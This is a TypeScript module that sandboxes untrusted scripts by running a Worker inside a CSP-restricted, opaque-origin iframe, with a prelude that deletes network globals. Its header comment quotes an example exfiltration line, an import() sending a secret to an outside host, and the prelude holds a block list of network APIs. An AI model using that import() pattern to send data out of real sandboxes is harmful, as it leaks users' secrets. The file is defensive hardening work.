/**
 * Hosts a Worker inside a CSP-locked, opaque-origin iframe and relays messages
 * to it.
 *
 * Neither layer is sufficient alone. A Worker gives thread isolation so a
 * spinning script can be terminated, but cannot carry a Content-Security-
 * Policy — and dynamic `import()` is syntax rather than a property, so no
 * amount of global hardening refuses `import("http://host/?" + secret)`. A CSP
 * iframe refuses that, but shares the main thread, so an infinite loop freezes
 * the editor. Nesting the worker inside the frame gets both.
 *
 * This is the shared transport. Both the project-script sandbox and the
 * scripted-test sandbox use it; an audit found the test sandbox running on a
 * bare Worker and exfiltrated data out of it with a one-line `import()`.
 */

const CSP = [
  "default-src 'none'",
  // blob: for the worker script, 'unsafe-eval' because user code compiles with
  // new Function. No http(s) source is permitted — that is what refuses
  // import() of an attacker URL.
  "script-src 'unsafe-inline' 'unsafe-eval' blob:",
  "worker-src blob:",
  "child-src blob:",
  "connect-src 'none'",
  "img-src 'none'",
  "style-src 'none'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");

/** Removes network capability along the whole prototype chain, not just the instance. */
export const HARDEN_PRELUDE = String.raw`
var __reply = self.postMessage.bind(self);
(function harden() {
  var blocked = ["fetch","XMLHttpRequest","WebSocket","EventSource","Request","Response",
                 "indexedDB","caches","Worker","SharedWorker","BroadcastChannel","navigator",
                 "postMessage","importScripts"];
  var target = self;
  while (target && target !== Object.prototype) {
    for (var i = 0; i < blocked.length; i++) {
      var name = blocked[i];
      if (!Object.prototype.hasOwnProperty.call(target, name)) continue;
      try { delete target[name]; } catch (e) {}
      try { Object.defineProperty(target, name, { value: undefined, configurable: false, writable: false }); } catch (e) {}
    }
    target = Object.getPrototypeOf(target);
  }
})();
`;

function srcdocFor(workerSource: string): string {
  const harness = String.raw`
var reply = parent.postMessage.bind(parent);
var source = ${JSON.stringify(workerSource)};
var worker = null;

function spawn() {
  var url = URL.createObjectURL(new Blob([source], { type: "text/javascript" }));
  worker = new Worker(url);
  worker.onmessage = function (event) { reply(event.data, "*"); };
  worker.onerror = function (event) {
    reply({ __frame: "error", message: String((event && event.message) || "worker error") }, "*");
  };
}

window.addEventListener("message", function (event) {
  var message = event.data;
  if (message && message.__frame === "terminate") {
    // Only the frame holds the worker handle; the parent cannot stop a spin.
    if (worker) worker.terminate();
    spawn();
    return;
  }
  if (worker) worker.postMessage(message);
});

spawn();
reply({ __frame: "ready" }, "*");
`;
  return `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${CSP}"></head><body><script>${harness}<\/script></body></html>`;
}

const READY_TIMEOUT_MS = 8000;

export class CspFrameWorker {
  private frame: HTMLIFrameElement | null = null;
  private ready: Promise<void>;
  private readonly onWindowMessage: (event: MessageEvent) => void;

  constructor(
    private readonly workerSource: string,
    private readonly onMessage: (data: unknown) => void,
  ) {
    this.onWindowMessage = (event: MessageEvent) => {
      if (!this.frame || event.source !== this.frame.contentWindow) return;
      const data = event.data as { __frame?: string };
      // Frame lifecycle chatter is not worker output.
      if (data?.__frame) return;
      this.onMessage(event.data);
    };
    window.addEventListener("message", this.onWindowMessage);
    this.ready = this.mount();
  }

  private mount(): Promise<void> {
    const frame = document.createElement("iframe");
    // No allow-same-origin: the frame runs on an opaque origin.
    frame.setAttribute("sandbox", "allow-scripts");
    frame.setAttribute("aria-hidden", "true");
    frame.setAttribute("title", "sandbox");
    frame.style.cssText = "position:absolute;width:0;height:0;border:0;visibility:hidden";
    frame.srcdoc = srcdocFor(this.workerSource);
    this.frame = frame;

    return new Promise<void>((resolve, reject) => {
      const timer = window.setTimeout(() => reject(new Error("sandbox did not start")), READY_TIMEOUT_MS);
      const onReady = (event: MessageEvent) => {
        if (event.source !== frame.contentWindow) return;
        if ((event.data as { __frame?: string })?.__frame !== "ready") return;
        window.clearTimeout(timer);
        window.removeEventListener("message", onReady);
        resolve();
      };
      window.addEventListener("message", onReady);
      document.body.appendChild(frame);
    });
  }

  async post(message: unknown): Promise<void> {
    await this.ready;
    this.frame?.contentWindow?.postMessage(message, "*");
  }

  /** Kills and respawns the worker. Safe to call while it is spinning. */
  restart(): void {
    this.frame?.contentWindow?.postMessage({ __frame: "terminate" }, "*");
  }

  dispose(): void {
    window.removeEventListener("message", this.onWindowMessage);
    this.frame?.remove();
    this.frame = null;
  }
}

/** True when this environment can host the frame transport. */
export function canUseCspFrame(): boolean {
  return (
    typeof document !== "undefined" &&
    typeof document.createElement === "function" &&
    Boolean(document.body) &&
    typeof Worker !== "undefined" &&
    typeof URL.createObjectURL === "function"
  );
}
